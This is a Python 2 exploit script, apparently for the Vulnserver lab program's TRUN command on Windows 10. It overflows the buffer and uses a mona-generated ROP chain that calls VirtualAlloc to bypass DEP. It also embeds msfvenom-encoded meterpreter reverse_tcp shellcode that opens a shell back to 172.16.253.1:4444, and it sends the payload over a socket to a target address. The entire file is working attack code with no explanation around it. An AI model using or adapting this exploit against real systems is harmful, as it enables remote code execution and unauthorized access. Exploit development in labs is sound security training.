"""
bypass DEP (Data Execution Prevention)win 10 with roop 
"""

import sys, struct
import socket


# Mona command : !mona rop -m *.dll -cp nonull
def create_rop_chain():

               # rop chain generated with mona.py - www.corelan.be
	rop_gadgets = [
		0x763aeb52,  # POP EAX # RETN [KERNELBASE.dll]
		0x76a2d02c,  # ptr to &VirtualAlloc() [IAT bcryptPrimitives.dll]
		0x74e21876,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll]
		0x7760eaa5,  # XCHG EAX,ESI # RETN [ntdll.dll]
		0x75f936c7,  # POP EBP # RETN [sechost.dll]
		0x625011c7,  # & jmp esp [essfunc.dll]
		0x75f19f7a,  # POP EAX # RETN [msvcrt.dll]
		0xffffffff,  # Value to negate, will become 0x00000001
		0x74eeaace,  # NEG EAX # RETN [KERNEL32.DLL]
		0x74f06e5b,  # XCHG EAX,EBX # RETN [KERNEL32.DLL]
		0x75f63fd2,  # POP EAX # RETN [sechost.dll]
		0xa1a09b17,  # put delta into eax (-> put 0x00001000 into edx)
		0x74e5e012,  # ADD EAX,5E5F74E9 # POP EBP # RETN 0x0C [RPCRT4.dll]
		0x7759c4c2,  # XCHG EAX,EDX # RETN [ntdll.dll]
		0x763af822,  # POP EAX # RETN [KERNELBASE.dll]
		0xffffffc0,  # Value to negate, will become 0x00000040
		0x74eeaace,  # NEG EAX # RETN [KERNEL32.DLL]
		0x76312c0c,  # XCHG EAX,ECX # RETN [KERNELBASE.dll]
		0x7644162d,  # POP EDI # RETN [KERNELBASE.dll]
		0x74ee9686,  # RETN (ROP NOP) [KERNEL32.DLL]
		0x7638f50b,  # POP EAX # RETN [KERNELBASE.dll]
		0x90909090,  # nop
		0x762ab7d8,  # PUSHAD # RETN [KERNELBASE.dll]
	]
	return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()

#  msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.253.1 LPORT=4444 -e x86/shikata_ga_nai -i 2 -f c -b "\x00\xdd\x0d"
shellcode =  ("\xda\xdc\xd9\x74\x24\xf4\xbe\xb5\xb0\x23\xfa\x58\x29\xc9\xb1"
"\x56\x31\x70\x18\x83\xc0\x04\x03\x70\xa1\x52\xd6\x06\x21\x10"
"\x19\xf7\xb1\x75\x93\x12\x80\xb5\xc7\x57\xb2\x05\x83\x3a\x3e"
"\xed\xc1\xae\xb5\x83\xcd\xc1\x7e\x29\x28\xef\x7f\x02\x08\x6e"
"\x03\x59\x5d\x50\x3a\x92\x90\x91\x7b\xcf\x59\xc3\xd4\x9b\xcc"
"\xf4\x51\xd1\xcc\x7f\x29\xf7\x54\x63\xf9\xf6\x75\x32\x72\xa1"
"\x55\xb4\x57\xd9\xdf\xae\xb4\xe4\x96\x45\x0e\x92\x28\x8c\x5f"
"\x5b\x86\xf1\x50\xae\xd6\x36\x56\x51\xad\x4e\xa5\xec\xb6\x94"
"\xd4\x2a\x32\x0f\x7e\xb8\xe4\xeb\x7f\x6d\x72\x7f\x73\xda\xf0"
"\x27\x97\xdd\xd5\x53\xa3\x56\xd8\xb3\x22\x2c\xff\x17\x6f\xf6"
"\x9e\x0e\xd5\x59\x9e\x51\xb6\x06\x3a\x19\x5a\x52\x37\x40\x32"
"\x97\x7a\x7b\xc2\xbf\x0d\x08\xf0\x60\xa6\x86\xb8\xe9\x60\x50"
"\xc9\xfe\x92\x8e\x71\x6e\x6d\x2f\x81\xa6\xaa\x7b\xd1\xd0\x1b"
"\x04\xba\x20\xa3\xd1\x56\x2b\x33\x76\xb6\xd6\xc2\xee\xb4\x28"
"\xd4\xb2\x31\xce\x86\x1a\x11\x5f\x67\xcb\xd1\x0f\x0f\x01\xde"
"\x70\x2f\x2a\x35\x19\xda\xc5\xe3\x71\x73\x7f\xae\x0a\xe2\x80"
"\x65\x77\x24\x0a\x8f\x87\xeb\xfb\xfa\x9b\x1c\x9c\x04\x64\xdd"
"\x09\x04\x0e\xd9\x9b\x53\xa6\xe3\xfa\x93\x69\x1b\x29\xa0\x6e"
"\xe3\xac\x90\x05\xd2\x3a\x9c\x71\x1b\xab\x1c\x82\x4d\xa1\x1c"
"\xea\x29\x91\x4f\x0f\x36\x0c\xfc\x9c\xa3\xaf\x54\x70\x63\xd8"
"\x5a\xaf\x43\x47\xa5\x9a\xd7\x80\x59\x58\xf0\x28\x31\xa2\x40"
"\xc9\xc1\xc8\x40\x99\xa9\x07\x6e\x16\x19\xe7\xa5\x7f\x31\x62"
"\x28\xcd\xa0\x73\x61\x93\x7c\x73\x86\x08\x8f\x0e\xe7\xaf\x70"
"\xef\xe1\xcb\x71\xef\x0d\xea\x4e\x39\x34\x98\x91\xf9\x03\x93"
"\xa4\x5c\x25\x3e\xc6\xf3\x35\x6b")


host = "172.16.253.128"
port = 9999

junk = "A" * 2006
EIP  = "\xaf\x11\x50\x62"
NOPS = "\x90" * 16
INT3 = "\xCC" 
padd = "C" * (3000 - 2006 - len(rop_chain) - 16 - len(shellcode))





payload = junk + rop_chain + NOPS +shellcode +padd

print payload
try:
	
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.connect((host,port))
	

	# Sending Payload
	print "[+] Sending Payload ..."
	sock.send('TRUN .'+payload+'\r\n')
	sock.close()


except:
	print "Exploit Failure"